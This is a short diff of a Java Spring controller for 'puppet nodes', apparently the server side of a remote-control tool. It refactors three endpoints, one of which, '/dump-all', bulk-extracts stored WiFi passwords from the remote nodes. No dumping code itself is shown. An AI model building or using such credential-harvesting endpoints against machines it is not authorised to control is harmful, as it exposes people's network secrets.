@@ -1,5 +1,6 @@
 package org.leo.web.controller.puppetnode.service;
 
+import org.leo.core.puppet.capability.WifiProfileCapable;
 import org.leo.core.util.ApiResponse;
 import org.leo.web.util.ControllerUtil;
 import org.springframework.web.bind.annotation.RequestBody;
@@ -18,7 +19,7 @@ public class WifiProfileController {
 
     @RequestMapping(value = "/list", method = RequestMethod.POST)
     public HashMap<String, Object> listProfiles(@RequestBody HashMap<String, Object> params) {
-        return ControllerUtil.handlePuppetCall(params, "列出 WiFi 配置失败", node -> node.listWifiProfiles());
+        return ControllerUtil.handleCapabilityCall(params, WifiProfileCapable.class, "列出 WiFi 配置失败", node -> node.listWifiProfiles());
     }
 
     @RequestMapping(value = "/detail", method = RequestMethod.POST)
@@ -27,11 +28,11 @@ public class WifiProfileController {
         if (profileName == null) {
             return ApiResponse.error("profileName 参数不能为空");
         }
-        return ControllerUtil.handlePuppetCall(params, "获取 WiFi 详情失败", node -> node.getWifiProfileDetail(profileName));
+        return ControllerUtil.handleCapabilityCall(params, WifiProfileCapable.class, "获取 WiFi 详情失败", node -> node.getWifiProfileDetail(profileName));
     }
 
     @RequestMapping(value = "/dump-all", method = RequestMethod.POST)
     public HashMap<String, Object> dumpAllPasswords(@RequestBody HashMap<String, Object> params) {
-        return ControllerUtil.handlePuppetCall(params, "批量提取 WiFi 密码失败", node -> node.dumpAllWifiPasswords());
+        return ControllerUtil.handleCapabilityCall(params, WifiProfileCapable.class, "批量提取 WiFi 密码失败", node -> node.dumpAllWifiPasswords());
     }
 }
